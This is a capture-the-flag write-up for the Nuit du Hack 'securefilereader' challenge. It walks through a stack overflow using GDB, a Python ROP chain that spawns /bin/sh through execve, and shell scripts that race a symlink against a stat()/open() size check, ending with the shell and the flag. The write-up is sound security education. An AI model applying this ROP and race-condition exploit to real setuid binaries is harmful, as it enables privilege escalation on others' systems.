
Hi,

I'm member of Pwnium tunisian CTF team. We were ranked #31 in this CTF ! 
Nice rank for a team of 2 members right ?

I hope we will do better next CTF ;)

The binary file takes a filename as argument and checks if the file size is less than 4096 then dumps its content to a buffer otherwise the program prints an error message.

Using GDB let's try to let the program accept a big filesize. To do this I changed the value returned by the check_size function to 1.

```bash
(python -c 'print "A"*4200') > /tmp/big
gdb pwn
gdb-peda$ b *0x08048F1A
gdb-peda$ r /tmp/big
gdb-peda$ set $eax=1
gdb-peda$ c
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ i r eip
eip 0x41414141 0x41414141
```

Great we have a segmentation fault. 4128 bytes is enough to overflow the return address.

The stack is not executable.

```bash
gdb-peda$ vmmap stack
Start      End        Perm Name
0xfffdd000 0xffffe000 rw-p [stack]
```

  
The system and execve does not exist in the binary so we can't do a big thing with Ret2libc.

```bash
readelf -s pwn | grep system
   702: 080d76e0    36 OBJECT  LOCAL  DEFAULT   10 system_dirs
   703: 080d76cc    16 OBJECT  LOCAL  DEFAULT   10 system_dirs_len
readelf -s pwn | grep exec
   890: 080bc800  2311 FUNC    LOCAL  DEFAULT    6 execute_cfa_program
   894: 080bd940  1884 FUNC    LOCAL  DEFAULT    6 execute_stack_op
  1186: 0809e580    88 FUNC    GLOBAL DEFAULT    6 _dl_make_stack_executable
  2209: 080ee9f4     4 OBJECT  GLOBAL DEFAULT   24 _dl_make_stack_executable
```

_dl_make_stack_executable is an interesting function and can be used to mark the stack as executable but I will do the job simpler.

Time for ROP ;)

The binary is statically linked with libc so there is a big probability to hit with a ROP chain to call execv syscall. I used ROPgadget to generate a rop chain. By testing it I got SIGSEGV at 0x00000000 and this because the gadgets contain NULL byte.

xor eax, eax; ret gadgets are located in offssets having NULL bytes. For this reason I had to manually resolve this issue. To go further I replaced xor eax eax; ret gadget with the following 2 gadgets mov eax, 0xffffffff; ret; inc eax; ret this will overflow the EAX register and the value will be 0.

  
The final ropchain I made was the following:


```python
from struct import pack

# Padding goes here
p = "A"*4124

p += pack('<I', 0x0807270a) # pop edx ; ret
p += pack('<I', 0x080ee060) # @ .data
p += pack('<I', 0x080beb26) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0809dead) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0807270a) # pop edx ; ret
p += pack('<I', 0x080ee064) # @ .data + 4
p += pack('<I', 0x080beb26) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0809dead) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0807270a) # pop edx ; ret
p += pack('<I', 0x080ee068) # @ .data + 8
#p += pack('<I', 0x08054700) # xor eax, eax ; ret  -> Issue here

p += pack('<I', 0x0804fc64)
p += pack('<I', 0x0807f15f)

p += pack('<I', 0x0809dead) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 0x080ee060) # @ .data
p += pack('<I', 0x08072731) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ee068) # @ .data + 8
p += pack('<I', 0x080ee060) # padding without overwrite ebx
p += pack('<I', 0x0807270a) # pop edx ; ret
p += pack('<I', 0x080ee068) # @ .data + 8
#p += pack('<I', 0x08054700) # xor eax, eax ; ret -> Issue here

p += pack('<I', 0x0804fc64)
p += pack('<I', 0x0807f15f)

p += pack('<I', 0x0807f15f) # inc eax ; ret
p += pack('<I', 0x0807f15f) # inc eax ; ret
p += pack('<I', 0x0807f15f) # inc eax ; ret
p += pack('<I', 0x0807f15f) # inc eax ; ret
p += pack('<I', 0x0807f15f) # inc eax ; ret
p += pack('<I', 0x0807f15f) # inc eax ; ret
p += pack('<I', 0x0807f15f) # inc eax ; ret
p += pack('<I', 0x0807f15f) # inc eax ; ret
p += pack('<I', 0x0807f15f) # inc eax ; ret
p += pack('<I', 0x0807f15f) # inc eax ; ret
p += pack('<I', 0x0807f15f) # inc eax ; ret
p += pack('<I', 0x08049501) # int 0x80
p += pack('<I', 0xdeadbeef) # deadbeef

f = open('/tmp/payload','wb')
f.write(p)
f.close()
```

Now how to let the program accept the created payload ? The program uses the stat() function to read the file size. This let me think in Race Condition. The idea is to provide a symlink to a small file at the begining and then after the program executes the stat() fucntion and before executing the open() function I point the symlink to the payload (big file). To do this I used the following 2 scripts:

  
race1.sh file

```bash
#!/bin/sh
for i in `seq 10000`
do
cp /tmp/small /tmp/flag
rm /tmp/flag
ln -s /tmp/payload /tmp/flag
rm /tmp/a
done
```

race2.sh file

```bash
#!/bin/sh
for i in `seq 10000`
do
/home/chall/pwn /tmp/flag
done
```

Copy all the necessary files to the server using SCP.

```bash
scp  -P 55552 /tmp/payload chall@securefilereader.quals.nuitduhack.com:/tmp
scp  -P 55552 /tmp/race1.sh chall@securefilereader.quals.nuitduhack.com:/tmp
scp  -P 55552 /tmp/race2.sh chall@securefilereader.quals.nuitduhack.com:/tmp
scp  -P 55552 /tmp/small chall@securefilereader.quals.nuitduhack.com:/tmp

```

Put all stuffs togther

```
cd /tmp
(sh race1.sh &) && sh race2.sh
```


And after few seconds you get a shell for you and your family for free :D

  

```bash
$ id
uid=1001(chall) gid=1001(chall) egid=1000(chall_pwned) groups=1000(chall_pwned),1001(chall)
$ cat /home/chall/flag
rUN!RuN$RUn!Y0U$W1N_TH3_R4c3
$
```

That's all !
